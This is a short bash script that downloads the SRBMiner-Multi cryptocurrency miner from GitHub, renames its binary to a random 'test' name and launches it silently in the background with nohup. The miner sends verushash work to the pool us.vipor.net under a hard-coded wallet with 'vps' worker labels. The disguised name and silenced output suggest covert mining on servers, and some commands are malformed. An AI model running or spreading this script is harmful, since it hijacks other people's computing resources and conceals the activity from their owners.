#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -q wget -O dot https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.1/SRBMiner-Multi-2-6-1-Linux.tar.gz

tar -xzf dot

mv SRBMiner-Multi-2-6-1 test

cd test

mv SRBMiner-Multi-2-6-1 test$kolot

nohup ./test$kolot ./SRBMiner-MULTI -a verushash -o stratum+tcp://us.vipor.net:5040 -u RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.vps-$kolot -p c=DGB > /dev/null 2>&1 &
